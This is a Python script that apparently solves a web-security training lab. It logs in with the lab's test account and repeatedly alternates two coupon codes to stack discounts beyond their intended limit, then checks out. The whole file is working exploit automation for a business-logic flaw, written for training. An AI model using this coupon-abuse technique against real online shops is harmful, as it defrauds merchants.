import random
import string
import time
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def add_prod_to_cart(s, url, path, productId, quantity):
    target_url = url + path
    payload = {
        'productId': productId,
        'redir': 'PRODUCT',
        'quantity': quantity,
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success add product to cart')
    else:
        print('[-] Fail to add product to cart')
        sys.exit(-1)

def extract_coupon(html_text):
    match = re.search(r'coupon\s+([A-Z0-9]+)', html_text)    
    if match:
        return match.group(1)
    return None

def get_coupon(s, url, path, csrf_path, email):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'email': email
    }
    r = s.post(target_url, data=payload)

    if 'Use coupon' in r.text and r.status_code == 200:
        coupon = extract_coupon(r.text)
        print(f'[+] Coupon = {coupon}')
        return coupon
    else:
        print('[-] Failed to get coupon')
        sys.exit(-1)

def apply_coupon(s, url, path, csrf_path, coupon):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'coupon': coupon
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if 'Coupon applied' in r.text and r.status_code == 302:
        print(f'[+] Successful applied coupon {coupon}')
    else:
        print('[-] Failed to applied coupon')
        sys.exit(-1)

def checkout(s, url, path, csrf_path):
    target_url = url + path
    payload = { 'csrf': get_csrf_token(s, url, csrf_path) }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if 'Your order is on its way!' in r.text and r.status_code == 200:
        print('[+] Successful bought the product')
    else:
        print('[-] Failed to buy product')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    coupon1 = 'NEWCUST5'
    coupon2 = 'SIGNUP30'

    login_acc(s, url, '/login', 'wiener', 'peter')
    add_prod_to_cart(s, url, '/cart', 1, 1)
    for _ in range(4):
        apply_coupon(s, url, '/cart/coupon', '/cart', coupon1)
        apply_coupon(s, url, '/cart/coupon', '/cart', coupon2)
    checkout(s, url, '/cart/checkout', '/cart')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()